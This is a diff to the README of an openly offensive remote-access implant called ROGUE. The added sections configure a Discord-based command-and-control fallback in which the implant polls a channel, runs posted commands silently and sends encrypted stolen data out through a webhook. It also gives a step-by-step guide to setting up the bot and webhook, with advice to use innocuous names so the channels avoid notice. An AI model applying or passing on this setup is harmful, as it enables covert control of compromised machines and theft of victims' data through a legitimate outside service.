@@ -178,6 +178,21 @@ This means:
  Works behind NAT
  All traffic looks like normal Discord HTTPS
 
+## Edit the top of your rogue_implant.py and replace the default placeholders:
+
+```bash
+# === Discord Fallback (Optional) ===
+DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/YOUR_CHANNEL_ID/messages?limit=1"
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID"
+BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"
+```
+ What Happens After Deployment:
+ 
+Implant checks the Discord channel every 30 seconds
+
+If a valid command is posted, it executes silently
+
+If exfil is triggered, an AES-encrypted blob is sent via webhook
 ---
 
 ##  Payload Arsenal
@@ -358,6 +373,58 @@ curl https://your-ngrok-url/.svc
 
 ---
 
+DISCORD WEBHOOK Setup Guide (Discord Bot, Webhook, and Channel)
+
+1. Create a Private Discord Server
+
+In Discord, click the + on your server list → "Create My Own"
+
+Name it something boring like updates or infra-notify
+
+2. Create a Command Channel
+
+Click + next to Text Channels → name it support, log, or news
+
+Right-click that channel → Copy Channel ID
+
+!First, enable Developer Mode:
+
+Settings → Advanced → Developer Mode → Enable
+
+3. Create a Discord Bot
+
+Visit https://discord.com/developers
+
+Create an application → name it ROGUE-C2
+
+Go to Bot tab → "Add Bot" → "Yes, do it"
+
+Under Token, click "Reset Token" → Copy Bot Token
+
+Under Privileged Gateway Intents, enable:
+
+Message Content Intent
+
+Server Members Intent
+
+Go to OAuth2 → URL Generator
+
+Select: bot scope
+
+Permissions: Read Messages/View Channels, Send Messages, Embed Links, Attach Files
+
+Copy the generated URL, paste in browser, invite to your server
+
+4. Create a Webhook
+
+Go to your channel → click settings → Integrations → Create Webhook
+
+Name it ROGUE-WEBHOOK, assign it to your command channel
+
+Click Copy Webhook URL
+
+---
+
 ##  Extending ROGUE
 
 * Add auto-update logic to implants
@@ -379,5 +446,5 @@ Use it to learn, to build.
 
 **R O G U E**
 Built by **ekomsSavior** 
-
+(*.*)
 
